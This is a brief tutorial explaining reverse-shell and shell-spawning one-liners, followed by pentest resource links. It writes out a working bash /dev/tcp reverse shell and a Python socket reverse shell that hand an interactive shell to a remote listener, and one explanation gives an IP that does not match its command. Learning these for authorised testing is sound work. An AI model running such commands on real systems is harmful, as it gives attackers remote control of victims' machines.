Command:

bash -i >& /dev/tcp/192.168.56.101/8080 0>&1

Explanation:

This command uses bash to create a network connection with the IP address 192.168.56.102 over port 8080. In order for this to work, the host 192.168.56.102 must have some sort of listener like netcat or Metasploit's multi/handler actively listening on port 8080. Bash -i makes an interactive instance of bash. First of all, there are three default files in bash. stdin which is standard input such as from the keyboard, stdout which is standard output such as the terminal, and stderr which is standard error, which is where errors are ouput. The file descriptors for stdin, stdout, and stderr are 0, 1, and 2 respectively. The >& causes it to send standard output and standard error to be sent through the connection /dev/tcp/192.168.56.101/8080, and 0>&1 sets standard input to be read through the connection. 


Command:

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Explanation:

This next command is a simple one liner that uses Python code to import the socket library, and initiate a network socket to the IP address and port specified within s.connect, which will connect to the listening server. 


Command:

python -c 'import pty; pty.spawn("/bin/sh")'

Explanation:

Let's take a look at this simple command here. This is a Python one liner to import the pty library which handles pseudo terminal utilities, and attempts to spawn a /bin/sh shell.


Command:

/bin/sh -i

Explanation:

This command spawns a /bin/sh shell by trying to run the command interactively with the -i switch.


Resources:
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://www.tldp.org/LDP/abs/html/io-redirection.html
https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01
https://netsec.ws/?p=337
https://github.com/alexxy/netdiscover
https://highon.coffee/blog/nmap-cheat-sheet/
https://cirt.net/Nikto2
https://tools.kali.org/web-applications/dirb
